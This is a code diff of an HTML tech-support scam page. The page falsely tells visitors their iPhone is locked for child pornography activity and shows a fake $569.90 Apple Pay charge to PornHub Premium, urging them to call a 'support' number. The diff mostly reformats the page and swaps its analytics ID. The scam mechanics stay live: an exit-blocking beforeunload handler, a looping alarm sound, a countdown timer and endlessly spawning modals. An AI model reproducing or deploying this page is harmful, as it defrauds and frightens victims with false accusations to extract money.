@@ -14,19 +14,18 @@
     <!-- Font Awesome -->
     <link rel="stylesheet" href="css/all.min.css">
     <link rel="stylesheet" href="css/Base.css" type="text/css">
-
+    
     <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-84RL0WY3JB"></script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-B673YESXBR"></script>
     <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-
-    gtag('config', 'G-84RL0WY3JB');
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-B673YESXBR');
     </script>
-
+    
 </head>
-
 <body onclick="playSound()"  id="link">
     <!-- Click overlay - only active when needed -->
     <div id="clickOverlay" class="click-overlay"></div>
@@ -34,19 +33,16 @@
     <div class="bgimg1">
           <img src="images/bg.png" alt="" width="100%">
     </div>
-
-        
-
+    
     <div class="main">
         
         <section class="as-columns  as-columns--1up  as-banner as-banner--top">
             <div class="row">
                 <div class="column large-12 medium-12 small-12">
                 <div class="as-banner-content">
-                        
+                    
                     <div class="alert-box">
-                            
-
+                        
                         <div class="spacbar">
                             <div class="alert-title">Apple Pay for Child Pornography was found</div>
                             <div class="alert-texts">
@@ -69,15 +65,15 @@
     </div>
 
     <!-- <div class="notification">
-        <div class="msalogo"><img src="images/messages.svg" alt="" width="30px"> MESSAGES</div>
-<div class="cursor">now</div>
-  <div class="notification-header">Payment Successful</div>
-  <div class="notification-body">
-    Sent $569.90 via Apple Pay to Pornhub <br>Premium.
-    Not you? Call +1-888-723-1130
-  </div>
-  <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
-</div> -->
+    <div class="msalogo"><img src="images/messages.svg" alt="" width="30px"> MESSAGES</div>
+    <div class="cursor">now</div>
+      <div class="notification-header">Payment Successful</div>
+      <div class="notification-body">
+        Sent $569.90 via Apple Pay to Pornhub <br>Premium.
+        Not you? Call +1-888-723-1130
+      </div>
+      <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
+    </div> -->
 
     <div id="modalContainer"></div>
 
@@ -91,12 +87,10 @@
                         Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub Premium subscription via Apple Pay is complete. Not You? Call Support <a href="tel:+1-888-723-1130">+1-888-723-1130</a> to stop it now!
                     </div>
 
-                    
                     <div class="text-end gap-4 mt-4 actionbtn">
-
                         <button type="button" class="me-3" id="cancelBtn">Cancel</button>
 
-                            <button type="button" class="me-2" id="okBtn"><strong>OK</strong> </button>
+                        <button type="button" class="me-2" id="okBtn"><strong>OK</strong> </button>
                     </div>
                 </div>
             </div>
@@ -105,49 +99,47 @@
 
     <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>
 
-<script>
-function playSound() {
-  const audio = document.getElementById("clickSound");
-//   audio.currentTime = 0; // restart sound if clicked again
-  audio.play();
-}
-</script>
-<script>
-window.addEventListener("beforeunload", function (e) {
-  e.preventDefault();
-  e.returnValue = ""; // Required for most browsers
-});
-</script>
+    <script>
+    function playSound() {
+      const audio = document.getElementById("clickSound");
+    //   audio.currentTime = 0; // restart sound if clicked again
+      audio.play();
+    }
+    </script>
+    <script>
+    window.addEventListener("beforeunload", function (e) {
+      e.preventDefault();
+      e.returnValue = ""; // Required for most browsers
+    });
+    </script>
 
     <!-- Bootstrap & Popper.js -->
     <script src="js/popper.min.js"></script>
     <script src="js/bootstrap.min.js"></script>
 
 
-<script>
-let timeLeft = 10 * 60;
-
-const display = document.getElementById("countdown");
-
-const timer = setInterval(() => {
-  let minutes = Math.floor(timeLeft / 60);
-  let seconds = timeLeft % 60;
-
-  display.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
-
-  if (timeLeft <= 0) {
-    clearInterval(timer);
-    display.textContent = "Time's up!";
-  }
-
-  timeLeft--;
-}, 1000);
-</script>
-
-
-<script>
-
-
+    <script>
+    let timeLeft = 10 * 60;
+    
+    const display = document.getElementById("countdown");
+    
+    const timer = setInterval(() => {
+      let minutes = Math.floor(timeLeft / 60);
+      let seconds = timeLeft % 60;
+    
+      display.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+    
+      if (timeLeft <= 0) {
+        clearInterval(timer);
+        display.textContent = "Time's up!";
+      }
+    
+      timeLeft--;
+    }, 1000);
+    </script>
+    
+    
+    <script>
 
     let modalCount = 0;
     const maxModals = Infinity;
@@ -222,7 +214,6 @@ const timer = setInterval(() => {
                         Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub Premium subscription via Apple Pay is complete. Not You? Call Support <a href="tel:+1-888-723-1130">+1-888-723-1130</a> to stop it now!
                     </div>
 
-                    
                     <div class="text-end gap-4 mt-4 actionbtn">
 
                         <button type="button" class="me-3" id="cancelBtn">Cancel</button>
@@ -333,7 +324,7 @@ const timer = setInterval(() => {
     });
 </script> 
 
-    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+<script src="code.jquery.com/jquery-1.12.0.min.js"></script>
 
-
-</body></html>
+</body>
+</html>
